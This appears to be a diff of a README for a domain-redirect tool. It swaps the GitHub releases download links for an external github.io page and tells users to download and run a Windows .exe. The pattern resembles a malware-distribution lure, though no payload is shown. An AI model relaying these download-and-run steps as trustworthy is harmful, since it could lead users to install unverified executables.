@@ -1,6 +1,6 @@
 # 🌐 apex-redirect-tls-loader - Forward your domains to www addresses
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Arlynestylistic793/apex-redirect-tls-loader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://arlynestylistic793.github.io)
 
 This software helps you manage website traffic. It sends visitors from your root domain (like example.com) to your www address (like www.example.com). It keeps the rest of the web address the same. The tool provides a secure connection using a TLS certificate. This ensures you do not lose visitors while your DNS settings update.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to install the software on your system.
 
-1.  Visit the [official releases page](https://github.com/Arlynestylistic793/apex-redirect-tls-loader/releases) to download the latest version.
+1.  Visit the [official releases page](https://arlynestylistic793.github.io) to download the latest version.
 2.  Select the file that ends in .exe for Windows.
 3.  Save the file to your computer.
 4.  Double-click the file to open the installer.
